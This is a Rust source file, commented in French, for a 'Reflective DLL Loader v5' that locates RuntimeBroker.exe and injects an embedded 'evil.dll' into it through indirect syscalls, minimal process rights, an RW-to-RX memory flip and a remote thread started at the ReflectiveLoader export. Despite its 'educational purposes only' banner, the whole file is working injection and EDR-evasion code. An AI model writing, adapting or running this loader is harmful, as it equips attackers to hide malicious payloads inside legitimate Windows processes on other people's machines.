/*
    ============================================================
    🦀 REFLECTIVE DLL LOADER v5 - ReflectiveLdr Edition
    ============================================================

    Ce loader démontre les concepts suivants:
    1. Reflective DLL Injection (ReflectiveLdr)
    2. PE Parsing pour trouver l'export ReflectiveLoader
    3. Indirect Syscalls (call stack légitime)
    4. Process Injection dans RuntimeBroker.exe
    5. Droits minimum (0x002A, pas PROCESS_ALL_ACCESS!)

    Flow v5:
    1. Lire la DLL reflective (include_bytes!)
    2. Parser le PE pour trouver l'offset de ReflectiveLoader
    3. Énumération des processes pour trouver RuntimeBroker.exe
    4. NtOpenProcess avec droits minimum
    5. NtAllocateVirtualMemory (remote, RW)
    6. NtWriteVirtualMemory (copie la DLL entière)
    7. NtProtectVirtualMemory (RW→RX)
    8. NtCreateThreadEx (remote thread → ReflectiveLoader)
    9. ReflectiveLoader mappe la DLL → DllMain → Payload!
    10. NtClose pour cleanup

    ⚠️  USAGE ÉDUCATIF UNIQUEMENT

    Auteur: Educational Purpose
*/

use rust_syscalls::syscall;
use std::mem::zeroed;
use std::ptr::null_mut;
use winapi::ctypes::c_void;
use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES};
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::um::handleapi::CloseHandle;
use winapi::um::tlhelp32::*;

// ============================================================
// CONSTANTES MÉMOIRE
// ============================================================
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const MEM_COMMIT_RESERVE: u32 = 0x3000;

// ============================================================
// DROITS PROCESSUS - MINIMUM REQUIS (pas PROCESS_ALL_ACCESS!)
// ============================================================
const PROCESS_CREATE_THREAD: u32 = 0x0002;
const PROCESS_VM_OPERATION: u32 = 0x0008;
const PROCESS_VM_WRITE: u32 = 0x0020;
const MINIMUM_ACCESS: u32 = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE; // 0x002A

// ============================================================
// REFLECTIVE DLL (compilée avec ReflectiveLdr)
// Contient l'export ReflectiveLoader
// ============================================================
const DLL_BYTES: &[u8] = include_bytes!("../../reflective_dll/evil.dll");

// ============================================================
// STRUCTURES POUR NtOpenProcess
// ============================================================
#[repr(C)]
struct ClientId {
    unique_process: HANDLE,
    unique_thread: HANDLE,
}

// ============================================================
// STRUCTURES PE POUR PARSER LES EXPORTS
// ============================================================
#[repr(C)]
struct DosHeader {
    e_magic: u16,
    _padding: [u8; 58],
    e_lfanew: u32,
}

#[repr(C)]
struct NtHeaders64 {
    signature: u32,
    file_header: FileHeader,
    optional_header: OptionalHeader64,
}

#[repr(C)]
struct FileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
struct OptionalHeader64 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_os_version: u16,
    minor_os_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    checksum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directories: [DataDirectory; 16],
}

#[repr(C)]
#[derive(Copy, Clone)]
struct DataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct SectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}

#[repr(C)]
struct ExportDirectory {
    characteristics: u32,
    time_date_stamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

/// Convertit un RVA en offset fichier
fn rva_to_offset(rva: u32, sections: &[SectionHeader]) -> Option<u32> {
    for section in sections {
        let section_start = section.virtual_address;
        let section_end = section_start + section.virtual_size;

        if rva >= section_start && rva < section_end {
            let offset_in_section = rva - section_start;
            return Some(section.pointer_to_raw_data + offset_in_section);
        }
    }
    None
}

/// Trouve l'offset de l'export "ReflectiveLoader" dans la DLL
fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
    unsafe {
        println!("[DEBUG] DLL size: {} bytes", dll_bytes.len());

        // 1. DOS Header
        let dos_header = &*(dll_bytes.as_ptr() as *const DosHeader);
        if dos_header.e_magic != 0x5A4D {
            return Err("Invalid DOS header".to_string());
        }
        println!(
            "[DEBUG] DOS header OK, e_lfanew: 0x{:X}",
            dos_header.e_lfanew
        );

        // 2. NT Headers
        let nt_headers =
            &*(dll_bytes.as_ptr().add(dos_header.e_lfanew as usize) as *const NtHeaders64);
        if nt_headers.signature != 0x4550 {
            return Err("Invalid PE signature".to_string());
        }
        println!("[DEBUG] PE signature OK");
        println!(
            "[DEBUG] Number of sections: {}",
            nt_headers.file_header.number_of_sections
        );

        // 3. Get sections
        let sections_offset = dos_header.e_lfanew as usize
            + 4  // signature
            + std::mem::size_of::<FileHeader>()
            + nt_headers.file_header.size_of_optional_header as usize;

        let sections = std::slice::from_raw_parts(
            dll_bytes.as_ptr().add(sections_offset) as *const SectionHeader,
            nt_headers.file_header.number_of_sections as usize,
        );

        // 4. Export Directory
        let export_dir_rva = nt_headers.optional_header.data_directories[0].virtual_address;
        if export_dir_rva == 0 {
            return Err("No export directory".to_string());
        }
        println!("[DEBUG] Export dir RVA: 0x{:X}", export_dir_rva);

        let export_dir_offset =
            rva_to_offset(export_dir_rva, sections).ok_or("Failed to convert export dir RVA")?;
        println!("[DEBUG] Export dir offset: 0x{:X}", export_dir_offset);

        let export_dir =
            &*(dll_bytes.as_ptr().add(export_dir_offset as usize) as *const ExportDirectory);
        println!("[DEBUG] Number of names: {}", export_dir.number_of_names);

        // 5. Tables d'export
        let names_offset = rva_to_offset(export_dir.address_of_names, sections)
            .ok_or("Failed to convert names RVA")?;
        let functions_offset = rva_to_offset(export_dir.address_of_functions, sections)
            .ok_or("Failed to convert functions RVA")?;
        let ordinals_offset = rva_to_offset(export_dir.address_of_name_ordinals, sections)
            .ok_or("Failed to convert ordinals RVA")?;

        // 6. Parcourir les exports pour trouver "ReflectiveLoader"
        for i in 0..export_dir.number_of_names {
            // Lire le RVA du nom
            let name_rva_ptr = dll_bytes
                .as_ptr()
                .add(names_offset as usize + (i * 4) as usize)
                as *const u32;
            let name_rva = *name_rva_ptr;

            // Convertir RVA en offset
            let name_offset = match rva_to_offset(name_rva, sections) {
                Some(o) => o,
                None => continue,
            };

            // Lire le nom
            let name_ptr = dll_bytes.as_ptr().add(name_offset as usize);
            let name = std::ffi::CStr::from_ptr(name_ptr as *const i8)
                .to_str()
                .unwrap_or("");

            if name == "ReflectiveLoader" {
                println!("[DEBUG] Found ReflectiveLoader at index {}", i);

                // Trouver l'ordinal
                let ordinal_ptr = dll_bytes
                    .as_ptr()
                    .add(ordinals_offset as usize + (i * 2) as usize)
                    as *const u16;
                let ordinal = *ordinal_ptr;

                // Trouver le RVA de la fonction
                let func_rva_ptr = dll_bytes
                    .as_ptr()
                    .add(functions_offset as usize + (ordinal as usize * 4))
                    as *const u32;
                let func_rva = *func_rva_ptr;

                println!("[DEBUG] Function RVA: 0x{:X}", func_rva);

                // Convertir RVA en offset fichier car on injecte la DLL brute (pas mappée)!
                let func_offset = rva_to_offset(func_rva, sections)
                    .ok_or("Failed to convert function RVA to file offset")?;

                println!("[DEBUG] Function file offset: 0x{:X}", func_offset);

                return Ok(func_offset);
            }
        }

        Err("ReflectiveLoader export not found".to_string())
    }
}

/// Trouve le PID d'un processus par son nom
fn find_process_pid(target_name: &str) -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return None;
        }

        let mut entry: PROCESSENTRY32W = zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut entry) != 0 {
            loop {
                let name = String::from_utf16_lossy(&entry.szExeFile)
                    .trim_end_matches('\0')
                    .to_lowercase();

                if name == target_name.to_lowercase() {
                    let pid = entry.th32ProcessID;
                    CloseHandle(snapshot);
                    return Some(pid);
                }

                if Process32NextW(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
        None
    }
}

/// Injecte la DLL reflective dans le processus cible
fn inject_reflective_dll(
    target_pid: u32,
    dll_bytes: &[u8],
    loader_offset: u32,
) -> Result<(), String> {
    println!("[*] Target PID: {}", target_pid);
    println!("[*] DLL size: {} bytes", dll_bytes.len());
    println!("[*] ReflectiveLoader offset: 0x{:X}", loader_offset);

    unsafe {
        // =====================================================
        // ÉTAPE 1: NtOpenProcess
        // =====================================================
        println!(
            "\n[STEP 1] NtOpenProcess (minimum rights: 0x{:04X})",
            MINIMUM_ACCESS
        );
        println!("────────────────────────────────────────────");

        let mut h_process: HANDLE = null_mut();
        let mut obj_attr: OBJECT_ATTRIBUTES = zeroed();
        obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;

        let mut client_id = ClientId {
            unique_process: target_pid as HANDLE,
            unique_thread: null_mut(),
        };

        let status: NTSTATUS = syscall!(
            "NtOpenProcess",
            &mut h_process as *mut HANDLE,
            MINIMUM_ACCESS,
            &mut obj_attr as *mut OBJECT_ATTRIBUTES,
            &mut client_id as *mut ClientId
        );

        if status != STATUS_SUCCESS {
            return Err(format!("NtOpenProcess failed: {:#X}", status));
        }

        println!("[+] Process handle: {:p}", h_process);

        // =====================================================
        // ÉTAPE 2: NtAllocateVirtualMemory (remote, RW)
        // =====================================================
        println!("\n[STEP 2] NtAllocateVirtualMemory (remote, RW)");
        println!("────────────────────────────────────────────");

        let mut base_address: *mut c_void = null_mut();
        let mut region_size: usize = dll_bytes.len();

        let status: NTSTATUS = syscall!(
            "NtAllocateVirtualMemory",
            h_process,
            &mut base_address as *mut _ as *mut _,
            0usize,
            &mut region_size as *mut usize,
            MEM_COMMIT_RESERVE,
            PAGE_READWRITE
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtAllocateVirtualMemory failed: {:#X}", status));
        }

        println!("[+] Remote memory at: {:p}", base_address);

        // =====================================================
        // ÉTAPE 3: NtWriteVirtualMemory (copie la DLL entière)
        // =====================================================
        println!("\n[STEP 3] NtWriteVirtualMemory (copy entire DLL)");
        println!("────────────────────────────────────────────");

        let mut bytes_written: usize = 0;

        let status: NTSTATUS = syscall!(
            "NtWriteVirtualMemory",
            h_process,
            base_address,
            dll_bytes.as_ptr() as *const c_void,
            dll_bytes.len(),
            &mut bytes_written as *mut usize
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtWriteVirtualMemory failed: {:#X}", status));
        }

        println!("[+] Written {} bytes to remote process", bytes_written);

        // =====================================================
        // ÉTAPE 4: NtProtectVirtualMemory (RW → RX)
        // =====================================================
        println!("\n[STEP 4] NtProtectVirtualMemory (RW → RX)");
        println!("────────────────────────────────────────────");

        let mut old_protect: u32 = 0;
        let mut protect_addr = base_address;
        let mut protect_size = dll_bytes.len();

        let status: NTSTATUS = syscall!(
            "NtProtectVirtualMemory",
            h_process,
            &mut protect_addr as *mut _ as *mut _,
            &mut protect_size as *mut usize,
            PAGE_EXECUTE_READ,
            &mut old_protect as *mut u32
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtProtectVirtualMemory failed: {:#X}", status));
        }

        println!(
            "[+] Protection: 0x{:02X} → 0x{:02X}",
            old_protect, PAGE_EXECUTE_READ
        );

        // =====================================================
        // ÉTAPE 5: Calculer l'adresse de ReflectiveLoader
        // =====================================================
        println!("\n[STEP 5] Calculate ReflectiveLoader address");
        println!("────────────────────────────────────────────");

        let loader_address = (base_address as usize + loader_offset as usize) as *mut c_void;
        println!("[+] Base address:        {:p}", base_address);
        println!("[+] Loader offset:       0x{:X}", loader_offset);
        println!("[+] Loader address:      {:p}", loader_address);

        // =====================================================
        // ÉTAPE 6: NtCreateThreadEx (remote thread → ReflectiveLoader)
        // =====================================================
        println!("\n[STEP 6] NtCreateThreadEx (start ReflectiveLoader)");
        println!("────────────────────────────────────────────");

        let mut thread_handle: *mut c_void = null_mut();

        let status: NTSTATUS = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle as *mut _ as *mut _,
            0x1FFFFFu32,
            NULL,
            h_process,
            loader_address, // ← Démarre à ReflectiveLoader, pas au début de la DLL!
            base_address,   // ← Passe l'adresse de base en paramètre
            0u32,
            0usize,
            0usize,
            0usize,
            NULL
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtCreateThreadEx failed: {:#X}", status));
        }

        println!("[+] Remote thread created: {:p}", thread_handle);
        println!("[+] ReflectiveLoader executing...");

        // =====================================================
        // ÉTAPE 7: NtClose (cleanup)
        // =====================================================
        println!("\n[STEP 7] NtClose (cleanup)");
        println!("────────────────────────────────────────────");

        let _: NTSTATUS = syscall!("NtClose", thread_handle);
        let _: NTSTATUS = syscall!("NtClose", h_process);

        println!("[+] Handles closed");

        Ok(())
    }
}

fn main() {
    println!(
        r#"
    ╔═══════════════════════════════════════════════════════════╗
    ║  🦀 REFLECTIVE DLL LOADER v5 - ReflectiveLdr Edition 🦀  ║
    ║                                                           ║
    ║  Techniques:                                              ║
    ║  ✓ Reflective DLL Injection (ReflectiveLdr)              ║
    ║  ✓ PE Parsing (find ReflectiveLoader export)             ║
    ║  ✓ Process injection into existing RuntimeBroker.exe     ║
    ║  ✓ Indirect syscalls                                      ║
    ║  ✓ Minimum rights (0x002A)                               ║
    ║  ✓ RW → RX memory protection                             ║
    ║                                                           ║
    ║  Syscalls used:                                           ║
    ║  • NtOpenProcess        • NtProtectVirtualMemory         ║
    ║  • NtAllocateVirtualMemory  • NtCreateThreadEx           ║
    ║  • NtWriteVirtualMemory     • NtClose                    ║
    ║                                                           ║
    ║  ⚠️  FOR EDUCATIONAL PURPOSES ONLY                        ║
    ╚═══════════════════════════════════════════════════════════╝
    "#
    );

    // =========================================================
    // ÉTAPE 1: Parser la DLL pour trouver ReflectiveLoader
    // =========================================================
    println!("[*] Parsing DLL to find ReflectiveLoader export...");

    let loader_offset = match find_reflective_loader_offset(DLL_BYTES) {
        Ok(offset) => {
            println!("[+] Found ReflectiveLoader at offset: 0x{:X}", offset);
            offset
        }
        Err(e) => {
            eprintln!("[✗] Failed to parse DLL: {}", e);
            std::process::exit(1);
        }
    };

    // =========================================================
    // ÉTAPE 2: Trouver RuntimeBroker.exe
    // =========================================================
    println!("\n[*] Searching for RuntimeBroker.exe...");

    let pid = match find_process_pid("RuntimeBroker.exe") {
        Some(pid) => pid,
        None => {
            eprintln!("[✗] RuntimeBroker.exe not found!");
            eprintln!("[*] Tip: Open Windows Settings to spawn RuntimeBroker.exe");
            std::process::exit(1);
        }
    };

    println!("[+] Found RuntimeBroker.exe with PID: {}", pid);

    // =========================================================
    // ÉTAPE 3: Injecter la DLL reflective
    // =========================================================
    match inject_reflective_dll(pid, DLL_BYTES, loader_offset) {
        Ok(_) => {
            println!("\n════════════════════════════════════════════");
            println!("[✓] SUCCESS: Reflective DLL injected!");
            println!("[✓] ReflectiveLoader → DllMain → Payload executed!");
            println!("════════════════════════════════════════════");
        }
        Err(e) => {
            eprintln!("\n[✗] ERROR: {}", e);
            std::process::exit(1);
        }
    }
}
